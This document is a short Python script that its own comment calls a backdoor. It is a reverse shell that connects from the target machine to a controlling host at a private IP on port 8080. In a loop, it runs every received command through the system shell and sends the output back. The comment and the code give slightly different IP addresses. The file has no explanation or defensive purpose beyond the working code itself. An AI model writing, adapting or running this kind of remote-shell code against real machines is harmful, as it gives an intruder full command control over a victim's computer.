import socket
import subprocess

'''
This is a simple connection backdoor that allow server 192.168.1.127 to connect 
to the target computer on port 8080
'''

def command_execution(command):
	return subprocess.check_output(command, shell=True)


my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
my_connection.connect(("192.168.1.217",8080))

my_connection.send("Connection OK \n")

while True:
	command = my_connection.recv(1024)
	command_output = command_execution(command)
	my_connection.send(command_output)

my_connection.close()
